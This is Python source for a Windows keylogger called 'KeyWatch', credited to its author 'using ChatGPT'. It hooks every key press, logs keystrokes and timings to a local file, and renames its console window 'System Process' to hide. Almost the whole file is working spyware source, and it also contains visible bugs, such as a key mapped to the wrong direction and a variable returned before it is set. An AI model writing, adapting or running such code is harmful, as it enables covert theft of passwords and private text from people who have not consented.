
#██╗░░██╗███████╗██╗░░░██╗░██╗░░░░░░░██╗░█████╗░████████╗░█████╗░██╗░░██╗
#██║░██╔╝██╔════╝╚██╗░██╔╝░██║░░██╗░░██║██╔══██╗╚══██╔══╝██╔══██╗██║░░██║
#█████═╝░█████╗░░░╚████╔╝░░╚██╗████╗██╔╝███████║░░░██║░░░██║░░╚═╝███████║
#██╔═██╗░██╔══╝░░░░╚██╔╝░░░░████╔═████║░██╔══██║░░░██║░░░██║░░██╗██╔══██║
#██║░╚██╗███████╗░░░██║░░░░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░╚█████╔╝██║░░██║
#╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
#Made by Arkem using ChatGPT


import keyboard
import os
import datetime
import win32gui
import sys
import ctypes
import win32con

KEY_MAP = {
    " ": "[SPACE]",
    "enter": "[ENTER]",
    "esc": "[ESC]",
    "ctrl": "[CTRL]",
    "alt": "[ALT]",
    "alt gr": "[ALT GR]",
    "tab": "[TAB]",
    "shift": "[SHIFT]",
    "maj": "[SHIFT]",
    "backspace": "[BACKSPACE]",
    "caps lock": "[CAPS LOCK]",
    "up": "[UP]",
    "haut": "[UP]",
    "down": "[DOWN]",
    "bas": "[DOWN]",
    "left": "[LEFT]",
    "gauche": "[LEFT]",
    "right": "[RIGHT]",
    "droite": "[LEFT]",
    "page up": "[PAGE UP]",
    "pg.suiv": "[PAGE UP]",
    "page down": "[PAGE DOWN]",
    "pg. prec": "[PAGE DOWN]",
    "home": "[HOME]",
    "end": "[END]",
    "fin": "[END]",
    "insert": "[INSERT]",
    "delete": "[DELETE]",
    "suppr": "[DELETE]",
    "f1": "[F1]",
    "f2": "[F2]",
    "f3": "[F3]",
    "f4": "[F4]",
    "f5": "[F5]",
    "f6": "[F6]",
    "f7": "[F7]",
    "f8": "[F8]",
    "f9": "[F9]",
    "f10": "[F10]",
    "f11": "[F11]",
    "f12": "[F12]",
}

NUM_LINES_TO_KEEP = 1000

log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")

if not os.path.exists(log_file):
    os.makedirs(os.path.dirname(log_file), exist_ok=True)
    open(log_file, "a").close()

def write_keys(keys_pressed, last_time, file):
    with open(file, "a") as f:
        if "[ENTER]" in keys_pressed:
            f.write("[ENTER]\n")
        else:
            current_time = datetime.datetime.now()
            time_diff = (current_time - last_time).total_seconds()
            if time_diff >= 1:
                time_str = f"({int(time_diff)} s)"
                if time_diff < 2:
                    time_str = f"({int(time_diff * 1000)} ms)"
                f.write(f"{time_str} {''.join(keys_pressed)}")
            else:
                f.write(''.join(keys_pressed))

        num_lines = sum(1 for _ in open(file))
        if num_lines > NUM_LINES_TO_KEEP:
            clean_file(file)

        return current_time


def clean_file(file):
    with open(file, "r") as f:
        lines = f.readlines()
    with open(file, "w") as f:
        f.writelines(lines[-NUM_LINES_TO_KEEP:])


def on_press(event):
    try:
        keys_pressed = []
        if event.name in KEY_MAP:
            keys_pressed.append(KEY_MAP[event.name])
        elif event.name.isprintable():
            keys_pressed.append(event.name)
        global last_time
        last_time = write_keys(keys_pressed, last_time, log_file)
    except Exception as e:
        print(f"Error: {e}")


def set_process_name():
    if hasattr(sys, 'frozen'):
        kernel32 = ctypes.WinDLL('kernel32')
        kernel32.SetConsoleTitleW("System Process")

if __name__ == "__main__":
    set_process_name()

    with open(log_file, "a") as f:
        f.write(
            f"\nLancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n"
        )

    last_time = datetime.datetime.now()

    keyboard.on_press(on_press)
    keyboard.wait()

